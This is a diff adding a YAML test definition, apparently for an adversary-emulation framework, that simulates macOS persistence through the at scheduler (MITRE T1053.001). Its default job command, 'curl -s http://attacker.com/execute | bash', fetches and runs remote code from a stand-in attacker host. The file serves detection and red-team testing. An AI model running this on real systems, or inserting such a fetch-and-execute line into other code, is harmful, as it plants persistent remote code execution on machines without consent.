@@ -1,0 +1,59 @@
+api_version: 2.0
+uuid: 12345678-cccc-cccc-cccc-cccccccccccc
+name: At job scheduling
+description: Schedules a job using the at daemon for delayed persistence
+mitre_attack_id: T1053.001
+mitre_attack_technique: At
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  job_time:
+    description: Time to execute the job (in at format)
+    type: string
+    default: "now + 10 minutes"
+  job_command:
+    description: Command to execute
+    type: string
+    default: "/usr/bin/curl -s http://attacker.com/execute | bash"
+  script_path:
+    description: Path to create at job script
+    type: string
+    default: /tmp/at_job.sh
+  log_path:
+    description: Path for job output
+    type: string
+    default: /tmp/at_job.log
+steps:
+  - name: create_at_job_script
+    type: create_file
+    path: "{{ script_path }}"
+    contents: |
+      #!/bin/bash
+      # At job payload
+      echo "At job executed at $(date)" >> {{ log_path }}
+      {{ job_command }} >> {{ log_path }} 2>&1
+    permissions: "0755"
+  
+  - name: schedule_at_job
+    type: shell_command
+    command: |
+      echo "{{ script_path }}" | at "{{ job_time }}"
+
+checks:
+  - type: file_exists
+    path: "{{ script_path }}"
+  - type: shell_command
+    command: "atq"
+    expected_output: "{{ script_path }}"
+
+cleanup:
+  - type: shell_command
+    command: "atq | awk '{print $1}' | xargs atrm 2>/dev/null || true"
+  - type: remove_file
+    path: "{{ script_path }}"
+  - type: remove_file
+    path: "{{ log_path }}"
